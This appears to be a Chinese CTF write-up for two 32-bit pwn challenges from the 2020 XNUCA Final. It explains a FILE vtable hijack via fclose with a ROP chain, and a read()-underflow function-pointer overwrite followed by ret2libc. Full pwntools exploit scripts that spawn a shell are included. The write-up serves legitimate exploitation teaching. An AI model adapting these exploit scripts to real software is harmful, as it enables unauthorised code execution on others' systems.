# 2020 XNUCA Final 个人赛 PWN WriteUp

阅读量 **355922**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-12 16:30:34

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0100aef53c2742b73c.jpg)

## pwn1

首先看一下程序，程序提供了一个打开和读取文件的功能，首先是输入了一个任意长度的`name`，然后进入`main`函数

    
    
    int __usercall hello@<eax>(int a1@<ebp>)
    {
      int v2; // [esp-4h] [ebp-4h]
    
      __asm { endbr32 }
      v2 = a1;
      puts("welcome to baby xnuca2020~");
      puts("I want to know your name");
      _isoc99_scanf("%s", you);
      return printf("Hello %s, I have kept you in mind\n", (unsigned int)you);
    }
    unsigned int __usercall menu@<eax>(int a1@<ebp>)
    {
      int v2; // [esp-24h] [ebp-24h]
      int v3; // [esp-20h] [ebp-20h]
      unsigned int v4; // [esp-10h] [ebp-10h]
      int v5; // [esp-4h] [ebp-4h]
    
      __asm { endbr32 }
      v5 = a1;
      v4 = __readgsdword(0x14u);
      while ( 1 )
      {
        while ( 1 )
        {
          puts("1.Read a file");
          puts("2.Print a file");
          puts("3.Exit");
          puts("> ");
          _isoc99_scanf("%s", &v3);
          v2 = atoi(&v3);
          if ( v2 != 2 )
            break;
          xPrint((int)&v5);
        }
        if ( v2 == 3 )
          break;
        if ( v2 == 1 )
          xRead();
        else
          puts("Invalid choise");
      }
      if ( you[8] )
        fclose(you[8]);
      return __readgsdword(0x14u) ^ v4;
    }
    

注意到我们在输入`name`的时候可以直接覆写`you[8]`也就是`FILE`指针，由于程序是静态编译的`32`位，因此这里我们可以直接覆写`vtable`，利用`fclose`劫持控制流。但是程序中不存在后门函数，但是存在一个`garbage`函数，该函数可以直接造成栈溢出，执行`rop`。

在找`gadget`的时候需要注意`scanf`， `exp`如下

    
    
    # encoding=utf-8
    from pwn import *
    
    file_path = "./pwn1"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        gdb.attach(p, "b *0x0804A1DA\n b *0x0804A0F1")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    else:
        p = remote('', 0)
        libc = ELF('')
        one_gadget = 0x0
    
    
    fake_io_address = 0x08104CE4
    garbage_address = 0x0804A0C0
    bin_sh_address = 0x08104CC0
    
    
    fake_io = p32(0xffffdfff)
    fake_io += b"\x00"*0x90
    fake_io += p32(fake_io_address + 0x90)
    fake_io += p32(garbage_address)
    
    payload = b"/bin/sh\x00".ljust(0x20, b"\x00")
    payload += p32(fake_io_address) + fake_io
    
    p.sendlineafter("your name\n", payload)
    
    p.sendlineafter("> ", "3")
    
    p_eax_r = 0x080cb04a
    p_eax_xx_r = 0x08066038 # pop eax; pop edx; pop ebx; ret;
    inc_eax_r = 0x0808f26e
    p_ebx_r = 0x08049022
    syscall = 0x0807216d
    xor_ecx = 0x0804ab3f # xor ecx, ecx; int 0x80;
    payload = b"a"*0x20
    payload += p32(p_eax_xx_r) + p32(8) + p32(0) + p32(bin_sh_address)
    payload += p32(inc_eax_r) * 3 + p32(xor_ecx)
    p.sendline(payload)
    
    p.interactive()
    

## pwn2

是个`read`函数越界的问题，漏洞位于`XRead`函数中

    
    
    v2 = get_num();
    if ( v2 < 0 )
    {
      puts("error");
      exit(0);
    }
    puts("Digest: ");
    do
    {
      if ( v1 >= v2 )
        break;
      v1 += read(0, (char *)&you[0x42] + v1, v2 - v1);
    }
    while ( *((_BYTE *)&you[65] + v1 + 3) != 10 );
    

用户首先输入长度，然后函数根据用户输入的长度向`bss`段中读取数据。但是需要注意的是，这里的长度并没有做任何的限制，而`bss`段的长度是有限的。

    
    
    0x8048000  0x8049000 r--p     1000 0      /root/work/2020XNUCA决赛/个人赛/pwn2/pwn2
    0x8049000  0x804a000 r-xp     1000 1000   /root/work/2020XNUCA决赛/个人赛/pwn2/pwn2
    0x804a000  0x804b000 r--p     1000 2000   /root/work/2020XNUCA决赛/个人赛/pwn2/pwn2
    0x804b000  0x804c000 r--p     1000 2000   /root/work/2020XNUCA决赛/个人赛/pwn2/pwn2 // << bss_end
    0x804c000  0x804d000 rw-p     1000 3000   /root/work/2020XNUCA决赛/个人赛/pwn2/pwn2
    

在动态链接的`read`函数中如果用户的输入超过了边界，并且边界之后不可写，那么`read`就会返回`-1`，那么就会变为`v1+=-1`，也就是会造成上溢出。

那么我们设置长度为`bss_end-&you[0x42] +
4`，也就是多输入`4`个字节，那么我们输入的内容就会覆写`you[0x41]`位置处的函数指针。将其覆写为`garbage`函数的地址，就可以利用该函数内部的栈溢出了。

    
    
    # encoding=utf-8
    from pwn import *
    
    file_path = "pwn2"
    context.arch = "i386"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        gdb.attach(p, "b *0x08049650")
        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        one_gadget = 0x0
    
    else:
        p = remote('', 0)
        libc = ELF('')
        one_gadget = 0x0
    
    
    def readfile(path, size, content):
        p.sendlineafter("> \n", "1")
        p.sendlineafter("file path: ", path)
        p.sendlineafter("Digest length: ", str(size))
        p.sendafter("Digest: ", content)
    
    
    p.sendlineafter("your name again", "a\n")
    p.recvuntil("present to you.\n")
    calloc_address = int(p.recvline().strip(b"\n")[2:], 16)
    libc.address = calloc_address - libc.sym['calloc']
    log.success("calloc address is {}".format(hex(calloc_address)))
    log.success("libc address is {}".format(hex(libc.address)))
    system_address = libc.sym['system']
    bin_sh_address = libc.search(b"/bin/sh").__next__()
    exit_address = libc.sym['exit']
    
    length = 0xe78+0x4
    garbage = 0x0804970F
    readfile("./flag", length, p32(garbage) + b"a"*(length - 0x5) + b"\n")
    
    p.sendlineafter("> \n", "3")
    
    payload = b"a"*0x1c + p32(0xdeadbeef)
    payload += p32(system_address) + p32(exit_address) + p32(bin_sh_address)
    p.sendline(payload)
    
    p.interactive()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **LYYL** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231471](/post/id/231471)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [双倍活动](/tag/双倍活动)

 **+1** __0赞

 __收藏

![](https://p3.ssl.qhimg.com/t01746f731cb508f164.png) LYYL

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

